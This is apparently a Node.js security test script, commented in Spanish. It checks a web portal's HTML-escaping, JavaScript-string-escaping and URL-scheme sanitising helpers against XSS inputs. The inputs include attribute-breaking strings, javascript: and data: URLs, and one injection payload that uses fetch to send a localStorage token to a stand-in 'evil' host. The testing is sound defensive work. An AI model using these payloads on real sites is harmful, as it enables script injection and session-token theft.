const fs = require('fs');
const src = fs.readFileSync('frontend/public/assets/app.js', 'utf8');

// Extraer las funciones helper para probarlas aisladas
const m = src.match(/const _ESC_MAP[\s\S]*?^}/m);
const escFn = src.match(/function esc\(str\)[\s\S]*?\n}/)[0];
const escJsFn = src.match(/function escJs\(str\)[\s\S]*?\n}/)[0];
const safeUrlFn = src.match(/function safeUrl\(u\)[\s\S]*?\n}/)[0];
const escMap = src.match(/const _ESC_MAP = \{[\s\S]*?\};/)[0];
const safeSchemes = src.match(/const _SAFE_SCHEMES = [^\n]*/)[0];

global.window = { location: { origin: 'https://portal.example' } };
global.URL = URL;
eval(escMap + '\n' + escFn + '\n' + escJsFn + '\n' + safeSchemes + '\n' + safeUrlFn);

let pass = 0, fail = 0;
function check(name, cond) {
  if (cond) { pass++; console.log('  OK   ' + name); }
  else { fail++; console.log('  FALLA ' + name); }
}

console.log('=== esc(): contexto texto y atributo ===');
check('escapa <script>', !esc('<script>alert(1)</script>').includes('<'));
check('escapa comilla doble (rompia value="...")', !esc('" onerror=alert(1) x="').includes('"'));
check('escapa comilla simple', !esc("' onload=alert(1)").includes("'"));
check('escapa backtick', !esc('`x`').includes('`'));
check('no rompe texto normal', esc('Cemento IP-30 50kg') === 'Cemento IP-30 50kg');

console.log('=== escJs(): string JS dentro de atributo HTML ===');
const payload = "x');fetch('//evil/?t='+localStorage._mkt_token);//";
const out = escJs(payload);
check('sin comilla simple literal', !out.includes("'"));
check('sin parentesis de cierre peligroso tras escape', !out.includes("');"));
check('sobrevive decodificacion HTML (sin & ni entidades)', !out.includes('&'));
// El valor decodificado por JS debe volver al original
check('roundtrip: JS lo lee como el string original', eval("'" + out + "'") === payload);
check('escapa < y > para no cerrar el atributo', !escJs('</script>').includes('<'));

console.log('=== safeUrl(): esquemas ===');
check('bloquea javascript:', safeUrl("javascript:alert(1)") === '#');
check('bloquea data:', safeUrl('data:text/html,<script>alert(1)</script>') === '#');
check('bloquea vbscript:', safeUrl('vbscript:msgbox(1)') === '#');
check('permite https', safeUrl('https://proveedor.com/ficha.pdf').startsWith('https://'));
check('permite mailto', safeUrl('mailto:a@b.com').startsWith('mailto:'));
check('permite tel', safeUrl('tel:+59170000000').startsWith('tel:'));
check('url invalida -> #', safeUrl('%%%') === '#' || safeUrl('%%%').startsWith('https://portal.example'));

console.log(`\n${pass} pasaron, ${fail} fallaron`);
process.exit(fail ? 1 : 0);
